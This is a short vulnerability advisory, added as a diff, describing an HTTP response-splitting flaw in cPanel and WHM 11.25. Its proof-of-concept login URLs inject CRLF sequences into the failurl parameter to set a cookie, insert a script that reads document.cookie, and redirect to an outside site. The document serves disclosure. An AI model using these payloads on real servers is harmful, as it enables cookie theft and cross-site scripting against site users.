@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/37902/info
+
+cPanel and WHM is prone to an HTTP response-splitting vulnerability.
+
+Attackers can leverage this issue to influence or misrepresent how web content is served, cached, or interpreted. This could aid in various attacks that try to entice client users into a false sense of trust.
+
+cPanel 11.25 and WHM 11.25 are vulnerable; other versions may also be affected. 
+
+http://www.example.com/login/?user=foo&pass=bar&failurl=%0D%0ASet-Cookie%3A%20Rec=Sec
+http://www.example.com/login/?user=foo&pass=bar&failurl=%0D%0AContent-Type:%20text/html%0D%0A%0D%0A%3Cscript%3Ealert%28%22Recognize-Security%20-%20%22%2Bdocument.cookie%29;%3C/script%3E%3C!--
+http://www.example.com/login/?user=foo&pass=bar&failurl=http://www.rec-sec.com
